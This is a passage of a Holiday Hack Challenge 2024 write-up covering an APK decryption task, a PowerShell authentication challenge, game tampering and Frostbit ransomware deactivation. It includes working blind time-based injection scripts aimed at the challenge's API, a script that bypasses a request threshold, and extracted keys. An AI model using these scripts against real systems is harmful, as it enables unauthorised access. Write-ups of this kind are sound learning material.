\\'%Ellie%\\'\"\n</code></pre> <p>We are now told to work with the release version. We need to follow additional steps to unpack this type of file as shared in the hints. There will be another name missing in this version.</p> AI usage <p>ChatGPT already gave me the method before I read the hints.</p> <p>The hints suggest to check the <code>strings.xml</code> file where we find the following strings related to encryption:</p> <pre><code>&lt;string name=\"ek\"&gt;rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=&lt;/string&gt;\n&lt;string name=\"iv\"&gt;Q2hlY2tNYXRlcml4&lt;/string&gt;\n</code></pre> <p>AI usage: file analysis</p> <p>We need to learn more about the encryption used in the application. I used ChatGPT to analyze the file \"DatabaseHelper.smali\" for interesting artifacts and it highlighted the following related to AES-GCM:</p> <p><code>const-string v0, \"AES/GCM/NoPadding\"</code></p> <p>AI usage: decryption script</p> <p>We want to mimick the decryption done in the application. I supplied ChatGPT the full decryption function and tasked it to write a Python script that we can use to decrypt data with the strings we found. It gave us this:</p> <pre><code>from base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\ndef decrypt_data(encrypted_data: str) -&gt; str:\n    try:\n        # Base64-decoded key and IV\n        encoded_key = \"rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=\"\n        encoded_iv = \"Q2hlY2tNYXRlcml4\"\n\n        decoded_key = b64decode(encoded_key)\n        decoded_iv = b64decode(encoded_iv)\n\n        # Decode the encrypted data from Base64\n        decoded_encrypted_data = b64decode(encrypted_data)\n\n        # Initialize the AES cipher in GCM mode\n        cipher = AES.new(decoded_key, AES.MODE_GCM, nonce=decoded_iv)\n\n        # Decrypt the data (automatically verifies the tag)\n        decrypted_bytes = cipher.decrypt_and_verify(\n            decoded_encrypted_data[:-16],  # Ciphertext (everything except last 16 bytes)\n            decoded_encrypted_data[-16:]  # Authentication tag (last 16 bytes)\n        )\n\n        # Convert decrypted bytes to UTF-8 string\n        return decrypted_bytes.decode('utf-8')\n\n    except Exception as e:\n        print(f\"Decryption failed: {e}\")\n        return None\n\n# Example Base64-encoded encrypted data (ciphertext + tag)\nencrypted_data = \"L2HD1a45w7EtSN41J7kx/hRgPwR8lDBg9qUicgz1qhRgSg==\"\n\ndecrypted_text = decrypt_data(encrypted_data)\n\nif decrypted_text:\n    print(\"Decrypted data:\", decrypted_text)\nelse:\n    print(\"Decryption failed.\")\n</code></pre> <p>At the bottom of the file we see this line with encrypted data that is then decrypted:</p> <pre><code>const-string v0, \"IVrt+9Zct4oUePZeQqFwyhBix8cSCIxtsa+lJZkMNpNFBgoHeJlwp73l2oyEh1Y6AfqnfH7gcU9Yfov6u70cUA2/OwcxVt7Ubdn0UD2kImNsclEQ9M8PpnevBX3mXlW2QnH8+Q+SC7JaMUc9CIvxB2HYQG2JujQf6skpVaPAKGxfLqDj+2UyTAVLoeUlQjc18swZVtTQO7Zwe6sTCYlrw7GpFXCAuI6Ex29gfeVIeB7pK7M4kZGy3OIaFxfTdevCoTMwkoPvJuRupA6ybp36vmLLMXaAWsrDHRUbKfE6UKvGoC9d5vqmKeIO9elASuagxjBJ\"\ninvoke-direct {p0, v0}, Lcom/northpole/santaswipe/DatabaseHelper;-&gt;decryptData(Ljava/lang/String;)Ljava/lang/String;\n</code></pre> <p>The decryption script outputs the following value that is once more encrypted:</p> <pre><code>Decrypted data: CREATE TRIGGER DeleteIfInsertedSpecificValue\nAFTER INSERT ON NormalList\nFOR EACH ROW\nBEGIN\n    DELETE FROM NormalList WHERE Item = 'KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8=';\nEND;\n</code></pre> <p>Answer</p> <p>The decrypted item gives: <code>Joshua, Birmingham, United Kingdom</code></p>"},{"location":"act_2/mobile_analysis/#response","title":"Response","text":"Eve Snowshoes <p>Aha! Success! You found it!</p> <p>Thanks for staying on your toes and helping me out\u2014every step forward keeps Alabaster\u2019s plans on track. You're a real lifesaver!</p> <p>Nice job completing the debug version\u2014smooth as a sleigh ride on fresh snow!</p> <p>But now, the real challenge lies in the obfuscated release version. Ready to dig deeper and show Alabaster\u2019s faction your skills?</p>"},{"location":"act_2/powershell/","title":"Powershell","text":"<p>Difficulty: </p>"},{"location":"act_2/powershell/#objective","title":"Objective","text":"<p>Task description</p> <p>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.</p>"},{"location":"act_2/powershell/#hints","title":"Hints","text":"PowerShell Admin Access - Fakeout EDR Threshold <p>They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response \"EDR\". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!</p> PowerShell Admin Access - Total Control <p>I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.</p>"},{"location":"act_2/powershell/#solution","title":"Solution","text":"SilverGold <p>This challenge presents us a terminal to experiment with PowerShell. We must execute tasks to proceed to the next one.</p> Solution to question 1 <p>Task</p> <p>There is a file in the current directory called 'welcome.txt'. Read the contents of this file</p> <pre><code>type welcome.txt\n</code></pre> Solution to question 2 <p>Task</p> <p>Geez that sounds ominous, I'm sure we can get past the defense mechanisms. We should warm up our PowerShell skills. How many words are there in the file?</p> <pre><code>Get-Content welcome.txt | Measure-Object -Word\n</code></pre> Solution to question 3 <p>Task</p> <p>There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?</p> <pre><code>netstat -l\n</code></pre> Solution to question 4 <p>Task</p> <p>You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?</p> <pre><code>Invoke-WebRequest http://localhost:1225\n</code></pre> Solution to question 5 <p>Task</p> <p>It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password.</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\nInvoke-WebRequest http://localhost:1225 -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication\n</code></pre> Solution to question 6 <p>Task</p> <p>There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal.</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\n$localhost = \"http://localhost:1225/endpoints/\"\n# loop over all endpoints returned in the previous task and count the words.\nFor ($i=1; $i -le 50; $i++) {\n    $endpoint = $localhost + $i\n    $page = Invoke-WebRequest $endpoint -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication\n    $length = $page.content | Measure-Object -Word\n    # stop when page has 138\n    if ($length.words -eq 138)\n        {\n            Write-Output \"Done\"\n            $page.Content\n            break;\n\n        }\n}\n</code></pre> Solution to question 7 <p>Task</p> <p>There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file!</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\n$page = Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication\n$page.Content\n</code></pre> Solution to question 8 <p>Task</p> <p>Luckily the defense mechanisms were faulty! There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\n$page = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication\n$page.Content\n</code></pre> Solution to question 9 <p>Task</p> <p>It looks like it requires a cookie token, set the cookie and try again.</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\n# set session with cookie\n$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession\n$cookie = New-Object System.Net.Cookie\n$cookie.Name = \"token\"\n$cookie.Value = \"5f8dd236f862f4507835b0e418907ffc\"\n$cookie.Domain = \"127.0.0.1\"\n$session.Cookies.Add($cookie);\n\n$page = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session\n$page.Content\n</code></pre> Solution to question 10 <p>Task</p> <p>Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint!</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\n# set session with 'token' cookie\n$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession\n$cookie_token = New-Object System.Net.Cookie\n$cookie_token.Name = \"token\"\n$cookie_token.Value = \"5f8dd236f862f4507835b0e418907ffc\"\n$cookie_token.Domain = \"127.0.0.1\"\n$session.Cookies.Add($cookie_token);\n\n$page = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session\n\n# add 'mfa_code' and 'mfa_token' to session based on returned data\n$cookie_mfa = New-Object System.Net.Cookie\n$cookie_mfa.Name = \"mfa_code\"\n$cookie_mfa.Value = \"5f8dd236f862f4507835b0e418907ffc\"\n$cookie_mfa.Domain = \"127.0.0.1\"\n$cookie = New-Object System.Net.Cookie\n$cookie.Name = \"mfa_token\"\n$cookie.Value = $page.Content.split(\"'\")[3]\n$cookie.Domain = \"127.0.0.1\"\n$session.Cookies.Add($cookie_mfa);\n$session.Cookies.Add($cookie);\n\n$page = Invoke-WebRequest http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session\n$page.Content\n</code></pre> Solution to question 11 <p>Task</p> <p>That looks like base64! Decode it so we can get the final secret!</p> <pre><code>[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==\"))\n\nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction\n</code></pre> <p>The hints give us a path to follow for the gold achievement. We want to use what we learned for the silver achievement</p> <p>AI usage</p> <p>Even though Google was used most frequently, ChatGPT supported during creation of some parts of the script for the gold achievement.</p> <p>Answer</p> <pre><code># set credentials\n$Username = \"admin\"\n$Password = ConvertTo-SecureString \"admin\" -AsPlainText -Force\n$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)\n\n# send and save request to get token overview, and save it for hash extraction\n$page = Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication\n$page.Content &gt; output.txt\nGet-Content output.txt -Head 49 | Select-Object -Skip 1 &gt; hashes.txt\n\n# extract SHA256 and MD5 hashes and save them into arrays\n$lines = Get-Content ./hashes.txt\n$lines_sha256 = @()\n$lines_md5 = @()\nforeach ($line in $lines) {\n    $lines_md5 += $line.substring(0, 32)\n\n    $stringAsStream = [System.IO.MemoryStream]::new()\n    $writer = [System.IO.StreamWriter]::new($stringAsStream)\n    $writer.write($line.substring(0, 32) + \"`n\")\n    $writer.Flush()\n    $stringAsStream.Position = 0\n    $lines_sha256 += Get-FileHash -InputStream $stringAsStream | Select-Object Hash\n}\n\n# send a request with a cookie per hash and use logic used for the silver achievement to load additional cookie data\n$response = @()\nforeach ($hash in $lines_sha256) {\n    Write-Output \"--------------------------------------------\n    Set 'token' cookie for md5 hash\n    --------------------------------------------\"\n    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession\n    $cookie = New-Object System.Net.Cookie\n    $cookie.Name = \"token\"\n    $cookie.Value = $lines_md5[$lines_sha256.IndexOf($hash)]\n    $cookie.Domain = \"127.0.0.1\"\n    $session.Cookies.Add($cookie);\n\n    Write-Output \"--------------------------------------------\n    Make request to /tokens/&lt;md5&gt; endpoint\n    --------------------------------------------\"\n    $url_token = \"http://127.0.0.1:1225/tokens/\" + $hash.Hash\n    $page_token = Invoke-WebRequest $url_token -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session\n    $page_token.RawContent\n\n    Write-Output \"--------------------------------------------\n    Set MFA cookies based on content just collected\n    --------------------------------------------\"\n    $cookie_mfa = New-Object System.Net.Cookie\n    $cookie_mfa.Name = \"mfa_code\"\n    $cookie_mfa.Value = $lines_md5[$lines_sha256.IndexOf($hash)]\n    $cookie_mfa.Domain = \"127.0.0.1\"\n    $cookie = New-Object System.Net.Cookie\n    $cookie.Name = \"mfa_token\"\n    $cookie.Value = $page_token.Content.split(\"'\")[1]\n    $cookie.Domain = \"127.0.0.1\"\n\n    $session.Cookies.Add($cookie_mfa);\n    $session.Cookies.Add($cookie);\n\n    # make more than 10 requests to mfa validation endpoint to go over EDR threshold, and save responses\n    $url = \"http://127.0.0.1:1225/mfa_validate/\" + $hash.Hash\n    1..11 | % {\n        Write-Output \"--------------------------------------------\n        Make request to /mfa_validate/&lt;sha256&gt; endpoint\n        --------------------------------------------\"\n        $page_mfa = Invoke-WebRequest $url -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session\n        $cookie_attempts = New-Object System.Net.Cookie\n        $cookie_attempts.Name = \"attempts\"\n        $cookie_attempts.Value = $page_mfa.Headers['Set-Cookie'].substring(9,14)\n        $cookie_attempts.Domain = \"127.0.0.1\"\n        $session.Cookies.Add($cookie_attempts);\n    }\n    $response += $page_mfa.Content\n}\n\n# iterate over saved responses and find index of the one that succeeded\nforeach($content in $response) {\n    if ($content -ne \"&lt;h1&gt;[-] ERROR: Access Denied&lt;/h1&gt;&lt;br&gt; [!] Logging access attempts\") {\n        $content\n        Write-Output \"Found endpoint, it is number: \" $response.IndexOf($content)\n    }\n}\n\n&lt;h1&gt;[+] Success, defense mechanisms deactivated.&lt;/h1&gt;&lt;br&gt;Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail&lt;/p&gt;\n</code></pre>"},{"location":"act_2/powershell/#response","title":"Response","text":"Piney Sappington <p>Fantastic work! You've navigated PowerShell\u2019s tricky waters and retrieved the codeword\u2014just what we need in these uncertain times. You're proving yourself a real asset!</p> <p>I'll let you in on a little secret\u2014there\u2019s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you're up for it? I know you are!</p> <p>Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.</p> <p>Well done! you've demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need\u2014keep up the great work!</p>"},{"location":"act_2/snowball_showdown/","title":"Snowball Showdown","text":"<p>Difficulty: </p>"},{"location":"act_2/snowball_showdown/#objective","title":"Objective","text":"<p>Task description</p> <p>Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.</p> Dusty Giftwrap <p>Hi there! I'm Dusty Giftwrap, back from the battlefield! I'm mostly here for the snowball fights!</p> <p>But I also don't want Santa angry at us, you wouldn't like him when he's angry. His face becomes as red as his hat! So I guess I'm rooting for Alabaster.</p> <p>Alabaster Snowball seems to be having quite a pickle with Wombley Cube. We need your wizardry.</p> <p>Take down Wombley the usual way with a friend, or try a different strategy by tweaking client-side values for an extra edge.</p> <p>Alternatively, we've got a secret weapon - a giant snow bomb - but we can't remember where we put it or how to launch it.</p> <p>Adjust the right elements and victory for Alabaster can be secured with more subtlety. Intriguing, right?</p> <p>Raring to go? Terrific! Here's a real brain tickler. Navigator of chaos or maestro of subtlety, which will you be? Either way, remember our objective: bring victory to Alabaster.</p> <p>Confidence! Wit! We've got what it takes. Team up with a friend or find a way to go solo - no matter how, let's end this conflict and take down Wombley!</p>"},{"location":"act_2/snowball_showdown/#hints","title":"Hints","text":"<p>There are no hints available.</p>"},{"location":"act_2/snowball_showdown/#solution","title":"Solution","text":"SilverGold <p>This is another minigame challenge. We need to throw snowballs at Wombley in game designed to be played as co-op:</p> <p></p> <p>The Snowball Showdown minigame.</p> <p>The simple way to win this game is to look for another player to play with and win. However, you can also play solo by changing the URL parameter 'singlePlayer' when in a private room:</p> <p><code>https://hhc24-snowballshowdown.holidayhackchallenge.com/game.html?username=T0m1nTh3Byt3s&amp;roomId=48b3a5b5&amp;roomType=private&amp;id=9cac813f-cb6e-4fa9-bf43-233bcc69c48c&amp;dna=ATATATTAATATATATATATTAGCATATATATTACGATATATATATATATATATTAATATATATATATATCGATATTACGATATATATATATGCCGATATATATATATTATAATATCGGC&amp;singlePlayer=true</code></p> <p>You can also make your life easier by altering some game parameters(1), such as the blast radius of the snowballs:</p> <ol> <li>Besides looking at the game code, we can quickly identity variables to check with this JavaScript code we can paste in the DevTools console: <code>for(var b in window) {if(window.hasOwnProperty(b)) console.log(b);}</code></li> </ol> <p><code>mainScene.snowBallBlastRadius = 10000</code></p> <p>The game will recognize this as cheating with a pop-up on the bottom of the screen but you can still get the achievement.</p> <p>Answer</p> <p>Change the URL parameter <code>singlePlayer</code> to true and win the game (possibly by editing game parameters to help you cheat).</p> <p>In game code we see the following snippet:</p> Code snippet in 'phaser-snowball-game.js'<pre><code>this.moasb = () =&gt; { this.ws.sendMessage({ type: 'moasb' }) }\n</code></pre> <p>'MOASB' sounds like 'MOAB', also known as 'Mother of All Bombs'. As we throw with snowballs, it might allude to 'Mother of All Snowballs'. We can call this function during a match:</p> <p><code>mainScene.moasb()</code></p> <p>A plane will appear that drops the MOASB! This is too cool not to show a screenshot of:</p> <p></p> <p>The MOASB in action!</p> <p>Answer</p> <p>Drop a MOASB by putting <code>mainScene.moasb()</code> in the console during a match.</p>"},{"location":"act_2/snowball_showdown/#response","title":"Response","text":"Dusty Giftwrap <p>Fantastic work! You've used your hacker skills to lead Alabaster\u2019s forces to victory. That was some impressive strategy!</p> <p>Christmas is on the line! For a mischievous edge-up, dive into the game\u2019s code - a few client-side tweaks to speed, movement, or power might shift the balance\u2026 or just help us find that secret weapon we misplaced!</p> <p>Excellent! With Wombley\u2019s forces defeated, they\u2019ll have no choice but to admit defeat and abandon their wild plans to hijack Christmas.</p>"},{"location":"act_3/deactivate/","title":"Deactivate Frostbit Naughty-Nice List Publication","text":"<p>Difficulty: </p>"},{"location":"act_3/deactivate/#objective","title":"Objective","text":"<p>Task description</p> <p>Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.</p>"},{"location":"act_3/deactivate/#hints","title":"Hints","text":"Frostbit Publication <p>There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.</p> Frostbit Slumber <p>The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.</p>"},{"location":"act_3/deactivate/#solution","title":"Solution","text":"<p>Warning</p> <p>This challenge only has a gold achievement.</p> <p>Warning</p> <p>This challenge requires you to have access to some information learned from the Decrypt challenge.</p>"},{"location":"act_3/deactivate/#recon","title":"Recon","text":"<p>The challenge Santa Vision gave us a hint in a MQTT message on the <code>frostbitfeed</code> topic:</p> <pre><code>Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/&lt;botuuid&gt;/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley\n</code></pre> <p>This is an API endpoint that seems to be used for deactivation functionality. We can get a bot UUID by following the first steps for the Decrypt challenge.</p> <p>The hints indicate to us that we need to look for a blind injection vulnerability while dealing with a filter. From Decrypt we also learn that there is a debug setting that can be enabled. The following curl command will trigger an error (change bot UUID accordingly):</p> Request<pre><code>curl -X GET \"https://api.frostbit.app/api/v1/frostbitadmin/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/deactivate?debug=1\" -H \"X-API-Key: '\"\n</code></pre> Response<pre><code>{\n  \"debug\": true,\n  \"error\": \"Timeout or error in query:\\nFOR doc IN config\\n    FILTER doc.&lt;key_name_omitted&gt; == '{user_supplied_x_api_key}'\\n    &lt;other_query_lines_omitted&gt;\\n    RETURN doc\"\n}\n</code></pre> <p>We learn that injection is possible and we get a glimpse of the query used, which appears to be for ArangoDB DBMS:</p> AI usage <p>ChatGPT was used to find the DBMS based on the error message.</p> ArangoDB query<pre><code>FOR doc IN config\n    FILTER doc.&lt;key_name_omitted&gt; == '{user_supplied_x_api_key}'\n    &lt;other_query_lines_omitted&gt;\n    RETURN doc\n</code></pre> <p>We know that we must look for blind injection. Specifically, we will work with time delays. The conditions in the query are processed synchronously on whether they are true or false. The moment the complete condition is considered to be either, the rest of the condition won't be processed. If we insert a delay at the end of the expression, we can check whether we reached that point of the conditions and thus test conditions to be true or false.</p> Blind injection using time delays<pre><code>-- This query doesn't get to the sleep, because the condition fails at the 1==2, causing the expression to completely fail\n' OR 1==2 AND SLEEP(1) AND '\n\n-- This query sleeps 1s because it keeps resolving after the OR, as the expression can still resolve to true\n' OR 1==2 OR SLEEP(1) AND '\n</code></pre>"},{"location":"act_3/deactivate/#injection","title":"Injection","text":"<p>We can now start learning more about the content in the database. The <code>doc</code> variable is likely an object since it has keys. Any query that takes more than 1 second must be false until at least the delay condition. This can be done by trial and error but eventually a script will support us.</p> <p>1. Number of attributes</p> <p>The <code>doc</code> object has one attribute:</p> <pre><code>-- We check the attributes that are not part of system, and we find 1\nvalue' OR LENGTH(ATTRIBUTES(doc, true)) == 1 OR SLEEP(1) OR '\n</code></pre> <p>2. Name of key</p> <p>The <code>doc</code> key can be found using a script.</p> AI usage <p>ChatGPT supported the generation of the Python script to figure out the key name.</p> Python script using 0.5s delay <pre><code>import requests\nimport string\nimport time\n\n# Target endpoint\nurl = \"https://api.frostbit.app/api/v1/frostbitadmin/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/deactivate?debug=1\"\n\n# Header to test\nheader_name = \"X-API-Key\"\n\n# Characters to test\ncharacters = string.ascii_letters + string.digits + string.punctuation\n\n# Function to test each character\ndef test_character(position, char):\n    payload = f\"' OR SUBSTRING(ATTRIBUTES(doc)[0], {position}, 1) == '{char}' OR SLEEP(0.5) OR '\"\n    headers = {header_name: payload}\n\n    start_time = time.time()\n    response = requests.get(url, headers=headers)\n    elapsed_time = time.time() - start_time\n\n    # If time delay is insignificant, the character matches\n    return elapsed_time &lt; 0.5\n\n# Main function to brute-force the key\ndef find_key():\n    key = \"\"\n    position = 0\n\n    while True:\n        found_char = None\n\n        for char in characters:\n            # Exclude filtered characters from test\n            if char not in [\"'\", \"`\", \";\", \"/\", \"\\\\\", \"*\"]:\n                print(f\"Testing position {position} with character '{char}'\")\n\n                if test_character(position, char):\n                    key += char\n                    found_char = char\n                    print(f\"Found character: {char} at position {position}\")\n                    break\n\n        if not found_char:\n            print(\"No more characters found. Brute-force completed.\")\n            break\n\n        position += 1\n\n    return key\n\nif __name__ == \"__main__\":\n    print(\"Starting SQL Injection Test...\")\n    key = find_key()\n    print(f\"Discovered key name: {key}\")\n</code></pre> Output<pre><code>No more characters found. Brute-force completed.\nDiscovered key name: deactivate_api_key\n</code></pre> <p>3. Value of key</p> <p>The <code>doc</code> key value can be found using the same script with small alterations and using the key name we found in the previous step.</p> Python script using 0.5s delay <pre><code>import requests\nimport string\nimport time\n\n# Target endpoint\nurl = \"https://api.frostbit.app/api/v1/frostbitadmin/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/deactivate?debug=1\"\n\n# Header to test\nheader_name = \"X-API-Key\"\n\n# Characters to test\ncharacters = string.ascii_letters + string.digits + string.punctuation\n\n# Function to test each character\ndef test_character(position, char):\n    payload = f\"' OR SUBSTRING(doc.deactivate_api_key), {position}, 1) == '{char}' OR SLEEP(0.5) OR '\"\n    headers = {header_name: payload}\n\n    start_time = time.time()\n    response = requests.get(url, headers=headers)\n    elapsed_time = time.time() - start_time\n\n    # If time delay is insignificant, the character matches\n    return elapsed_time &lt; 0.5\n\n# Main function to brute-force the key\ndef find_key():\n    key = \"\"\n    position = 0\n\n    while True:\n        found_char = None\n\n        for char in characters:\n            # Exclude filtered characters from test\n            if char not in [\"'\", \"`\", \";\", \"/\", \"\\\\\", \"*\"]:\n                print(f\"Testing position {position} with character '{char}'\")\n\n                if test_character(position, char):\n                    key += char\n                    found_char = char\n                    print(f\"Found character: {char} at position {position}\")\n                    break\n\n        if not found_char:\n            print(\"No more characters found. Brute-force completed.\")\n            break\n\n        position += 1\n\n    return key\n\nif __name__ == \"__main__\":\n    print(\"Starting SQL Injection Test...\")\n    key = find_key()\n    print(f\"Discovered API key: {key}\")\n</code></pre> Output<pre><code>No more characters found. Brute-force completed.\nDiscovered API Key: abe7a6ad-715e-4e6a-901b-c9279a964f91\n</code></pre> <p>Answer</p> <p>We have found the API key and can now make a legitimate request:</p> Final request<pre><code>curl -X GET \"https://api.frostbit.app/api/v1/frostbitadmin/bot/9c9c27f8-1436-4c04-b5fd-3a473d8c630e/deactivate?debug=1\" -H \"X-API-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91\"\n</code></pre> Response<pre><code>{\n\"message\": \"Response status code: 200, Response body: {\\\"result\\\":\\\"success\\\",\\\"rid\\\":\\\"cf9b1b33-b17b-433b-a473-2d8c5f06c1a5\\\",\\\"hash\\\":\\\"b8f559c581572c6774c8226e18fd924b362fccaab37943a8004446df066fdb69\\\",\\\"uid\\\":\\\"82455\\\"}\\nPOSTED WIN RESULTS FOR RID cf9b1b33-b17b-433b-a473-2d8c5f06c1a5\",\n\"status\": \"Deactivated\"\n}\n</code></pre>"},{"location":"act_3/decrypt/","title":"Decrypt the Naughty-Nice List","text":"<p>Difficulty: </p>"},{"location":"act_3/decrypt/#objective","title":"Objective","text":"<p>Task description</p> <p>Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.</p> Tangle Coalbox <p>Ah, there ya are, Gumshoe! Tangle Coalbox at yer service.</p> <p>Heard the news, eh? The elves\u2019 civil war took a turn for the worse, and now, things\u2019ve really gone sideways. Someone\u2019s gone and ransomware\u2019d the Naughty-Nice List!</p> <p>And just when you think it can't get worse\u2014turns out, it was none other than ol\u2019 Wombley Cube. He used Frostbit ransomware, all right. But, in true Wombley fashion, he managed to lose the encryption keys!</p> <p>That\u2019s right, the list is locked up tight, and it\u2019s nearly the start of the holiday season. Not ideal, huh? We're up a frozen creek without a paddle, and Santa\u2019s big day is comin\u2019 fast.</p> <p>The whole North Pole\u2019s stuck in a frosty mess, unless\u2014there\u2019s someone out there with the know-how to break us out of this pickle.</p> <p>If I know Wombley\u2014and I reckon I do\u2014he didn't quite grasp the intricacies of Frostbit\u2019s encryption. That gives us a sliver o' hope.</p> <p>If you can crack into that code, reverse-engineer it, we just might have a shot at pullin\u2019 these holidays outta the ice.</p> <p>It\u2019s no small feat, mind ya, but somethin\u2019 tells me you've got the brains to make it happen, Gumshoe.</p> <p>So, no pressure, but if we don\u2019t get this solved, the holidays could be in a real bind. I'm countin\u2019 on ya!</p> <p>And when ya do crack it, I reckon Santa\u2019ll make sure you're on the extra nice list this year. What d\u2019ya say?</p>"},{"location":"act_3/decrypt/#hints","title":"Hints","text":"Frostbit Hashing <p>The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns before forwarding requests to the backend application. A reverse proxy may reject requests it considers invalid. You may need to employ creative methods to ensure the request is properly forwarded to the backend. There could be a way to exploit the cryptographic library by crafting a specific request using relative paths, encoding to pass bytes and using known values retrieved from other forensic artifacts. If successful, this could be the key to tricking the Frostbit infrastructure into revealing a secret necessary to decrypt files encrypted by Frostbit.</p> Frostbit Dev Mode <p>There's a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn't disable dev mode, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be broadcasting MQTT messages.</p> Frostbit Crypto <p>The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use.</p> Frostbit Forensics <p>I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, 